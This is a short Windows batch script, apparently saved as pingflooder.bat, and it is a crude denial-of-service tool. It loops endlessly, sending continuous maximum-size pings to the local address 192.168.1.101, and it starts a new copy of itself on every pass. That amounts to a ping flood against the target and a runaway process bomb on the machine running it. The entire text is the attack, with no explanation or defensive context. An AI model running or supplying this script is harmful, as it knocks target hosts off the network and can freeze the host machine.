@echo off
:loop
ping -l 65535 -t 192.168.1.101
start pingflooder.bat
goto loop
